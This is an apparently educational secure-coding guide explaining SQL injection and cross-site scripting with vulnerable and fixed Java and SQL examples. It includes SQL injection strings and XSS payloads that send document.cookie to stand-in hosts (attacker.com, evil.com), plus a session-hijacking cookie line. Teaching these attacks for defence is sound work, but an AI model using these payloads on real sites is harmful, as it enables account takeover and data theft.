## What is Secure Code? üåê

 Secure coding is the practice of developing software with a strong emphasis on security. By writing secure code, developers can minimize vulnerabilities, reducing the risk of attackers exploiting a system or service. 
 
 Imagine you and your family are going on vacation, but securing your home is not a priority. You may leave doors unlocked, windows open, or even the garage ajar‚Äîcreating multiple entry points for intruders to steal valuable items. Similarly, insecure code leaves applications exposed to cyber threats.


 This is why writing secure code is essential, especially when handling confidential and sensitive information. Implementing security best practices from the start helps protect systems, data, and users from potential breaches.

## Common Vulnerabilites in Code

<h3><u>SQL Injection (SQLi):</u></h3>

A vulnerability that allows an attacker to manipulate SQL queries executed by a relational database. SQL databases store data in structured tables, making them easy to query using Structured Query Language (SQL). If an application fails to properly handle user input, attackers can inject malicious SQL code to gain unauthorized access, modify data, or even delete entire databases.

A normal login query would look like this:  
```sql
SELECT * FROM users WHERE username = 'ryan' AND password = 'Britishqw43$';
``` 

Whenever we try to type our username and password into a website, this is backend query that is occuring. 

A way an attacker can exploit this is by running: 

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = ''; 
```

In this case, we are asking if there are any users with an empty string, hence ' '. The important manipulation part is the `OR 1=1`. This is saying "Is there a user with an empty string or does 1 equal the value of 1?. Well, that math does make sense, so I will let you in". Now the `--' AND password = ''` is commented out because of the `--` which is saying "We don't need the password anymore". 

Mind you, this is not neccesarily granting you access to the website via UI such as logging into your banking app and seeing the purchases you have made. It is granting access to the backend database that powers the application. 

Lets take a look at how this would look in Java. Down below, there is some code from OWASP where JDBC (Java Database Connectivity) is communicating with a database. 

```java 
String query = "SELECT account_balance FROM user_data WHERE user_name = "
             + request.getParameter("customerName");
try {
    Statement statement = connection.createStatement( ... );
    ResultSet results = statement.executeQuery( query );
}
```
It is trying to get the account balance of a user based on their customer name input. However, the issues lies with `+ request.getParameter("customerName");`. If a user would  input their name it would return: 

```sql
SELECT * FROM users WHERE name = ryan
```

This is not good because SQL expects the input to return as a string in order to process it. A user can enter `' OR '1'='1` to gain access. You might say "oh just add a quote inside the query". This would work however there is a catch --> 

```sql
String query = "SELECT * FROM users WHERE name = '" + input + "'";

SELECT * FROM users WHERE name = 'ryan OR 1=1'
```
In this, the `'"` opens the string. We add an `input` such as a name and the end the string with `"'"` as a single quote. If an attacker were to try and inject, it would return as a single string. This means SQL is trying to process it but there is no username such as that. It would reject that input which prevents the injection. Keep in mind, the attacker wants to break out of the string when we take a look at the catch --> 

```sql
' OR '1'='1
``` 
The attacker would end the string with a `'`. so it would be `'ryan' OR '1'='1 ` which allows the attacker to end the string, then perform the injection. A way to prevent a SQLi would be using <b>parameterized queries</b> also known as prepared statements: 

```java
String query = "SELECT account_balance FROM user_data WHERE user_name = ? "; // placeholder
PreparedStatement pstmt = connection.prepareStatement( query ); // object that helps Java talk to database safely
pstmt.setString(1, input); // secret!! *
ResultSet results = pstmt.executeQuery( ); // runs query and gives results to database 
```
The `?` is placeholder; it holds the users input, but does not run the query to the database. 

In `pstmt.setString(1, input);`, `1` means the first `?` as you can have `2`, `3` etc.. and the `input` means the value the user typed in association with the number. 

Java says to the database "I'm going to give you a value, it is not SQL code, just <b>plain text</b>". The database would say "Alright, let me plug it in. Hmm, there is nothing related to that, sorry man". Let's rollback and see what happens if an attacker performs a SQLi: 

```sql
' OR '1'='1 -- attackers input

WHERE name = ''' OR ''1''=''1' -- database response
```

Since the database treats it as <b>plain text</b>, the result is a string with a weird name which is not in the database. This rejects the input which protects the database from injection.

---

The second way would be using <b>Stored Procedures</b>. In the database, we can input pre-written SQL code that defines a method without dynamic SQL, then user Java to call it. This helps us reuse the code across platforms, and improve performance by reducing parse and compile time. 

However, companies have to use this carefully as it can be risky. Let's take a look at some secure code: 

```sql
-- SQL 

CREATE PROCEDURE sp_getAccountBalance
    @CustomerName VARCHAR(100)
AS
BEGIN
    SELECT account_balance
    FROM user_data
    WHERE user_name = @CustomerName;
END;
```
This is a safe stored procedure as it is using the parameter "@CustomerName" and it does not use string concatenation or dynamic SQL. 

On the contrary, insecure code would look like this: 

```sql
CREATE PROCEDURE sp_getAccountBalance
    @CustomerName VARCHAR(100)
AS
BEGIN
    DECLARE @query NVARCHAR(MAX);
    SET @query = 'SELECT account_balance FROM user_data WHERE user_name = ''' + @CustomerName + '''';
    EXEC sp_executesql @query;
END;
```
This is not good as the input is merged as a string and it is using dynamic SQL, which means if an attacker enters `' OR '1'='1`, they could break it. 

Now to call the safe procedure, let's take a look at some Java from OWASP: 

```java
// Java

String custname = request.getParameter("customerName"); // gets input from user (input->ryan, custname=ryan)
try {
  CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}"); //prepares call to prepared statement (? very important to store as plain text/placeholder)
  cs.setString(1, custname);
  ResultSet results = cs.executeQuery(); // runs stored procedure on database
} catch (SQLException se) { // logging and error handling
}
```
---

The third way would be an <b> Allow-list Input Validation.</b> As we know, the main main to protect against a SQLi is by using parameterized queries by passing data as plain text rather than SQL logic. However, we cannot bind table names, table columns, or sort order keywords (ACS or DESC) with `?`. In order to get those values, we would have to use SQL commands, but that database vulnerable to a SQLi. 

To get these values and protect against a SQLi, we can write in Java: 

```java
String tableName; // variable tableName
switch(PARAM): // smarter if-else, PARAM = user input
  case "users": tableName = "users"; //if PARAM = users, safely set tableName = users
                 break;
  case "admins": tableName = "admins"; //if PARAM = admins, safely set tableName = admins
                 break;
  ...
  default      : throw new InputValidationException("unexpected value provided" 
                                                  + " for table name"); 
//input not equal; throws exception
```
The switch statements checks "Does this input match one of my safe options"? If it matches (example-> `users`) `tableName` = `users` so that the user can safely perform a query. 

---

The last way, which is NOT recommended would be <b>Escaping All User Input Manually</b>. This method tries to stop a SQL by "escaping" which simply means adding special characters so that the input is safe. 

For instance, before we learnt that if a software developer were to use a `'` in between the `""` -> `"'"`, an attacker can end the string, or use other characters such as `--`, `#`, `/* */` to get out of the string = succesful SQLi

<h3>Cross-Site Scripting (XSS)</h3>

These are types of attacks where malicous scripts usually in the form of Javascript are injected into a web application by a innocent end user. This happens because of insecure handling of user input such as the "search bar". There are three types of attacks: 

- <b>Non-persistent (reflected):</b> Attackers would send a user a link by utilizing impersonification, phishing, smishing, or any way to gain trust of the user to click the link. This link would contain malicious Javascript, where once the user performs that HTTP request to the server, the server reflects that HTTP request as a response.  
  
  For example: 

  ```javascript
  https:www.amazon.com/search?q=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
  ```
    This script would run in back if a user simply sees "amazon.com" which looks normal and the user is most likely using amazon to purchase products. However, once a user clicks the link, it would automatically take them to amazon's search perform the reflected injection: `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`into the web browser. This would take the users cookies/session ID and send it to the attacker. 

    The cookies/session ID keeps you logged in and server uses it to know who you are. Once the attacker gets a hold of it, they can set their own browser's session to your stolen one: 
    
    ```javascript
    document.cookie = "session_id=abc123xyz";
    ```
    Once set, they can visit the webpage, and they'd be logged in as you. 

- <b>Persistent (stored):</b> This is a bit different where the attacker would also find a vulnerable input field, but one that stores data in a database. Somes fields include the review section on amazon, comments, message forums, etc... This does not require a user to click a link like in non-persistent XSS, a user simply just has to visit the webpage like normal web browsing. 

  An attacker would post a comment along with the malicious script. An example would be:  
  ```javascript
  Great product, it works pretty good! <script>fetch('http://evil.com/steal?c=' + document.cookie)</script>
  ```
    This script is now <b>persistent</b> (stored and stuck there) in the database. Now, when any other user views that product page, the script runs automatically in the victim's web browser and sends session cookies or sensitive information to the attacker's server. 

    A software developer must remediate this or else it is stuck there and is especially dangerous if an admin view its. This is because the attacker can perform actions as the admin and escalate privileges. 

- <b>DOM (Document Object Model) Based XSS:</b> For the other attacks mentions before, the malicious payload is either sent to the server (reflected) or stays in the server (stored). In this case, the malcious payload never reaches the server. This means the server can't detect it, and can't sanitize or filter the user input. The client-side vulnerable JavaScript code would get exploited. Just like reflected XSS, the user must open a specially crafted URl for this attack to occur. 

<hr>

To defend against a XSS attack, there is not one way to solve it, rather a combination of techniques. Luckily, popular frameworks like React steer Software developers towards good security coding practices to help reduce XSS attacks, but not entirely. There are a couple of techniques to defend against this: 

- <b>Output Encoding:</b> This protects against Stored and Reflected attacks where the text inserted by the user should not be interpreted as executable code, rather the actual text that the user has typed in. 

  "HTML Contexts" --> refers to inserting a variable between two basic HTML tags like a `<div>` or `<b>`. In this case, the front end HTML trusts the user input and directly asks the backend for the results: 

  ``` html
  <!-- Vulnerable Code -->
  <p>Results for: <%= SearchQuery %><p> <!-- This is trying to get the results from the backend. This is bad practice as the attacker can control this because we have not escaped it -->

  <!-- THE ATTACK! -->
  <script>alert('XSS')</script> <!--injected into search query and asks DB-->

  <!-- Rendered HTML Results Page -->
  <p>Results for: <script>alert('XSS')</script></p> <!--browser then runs the attack-->
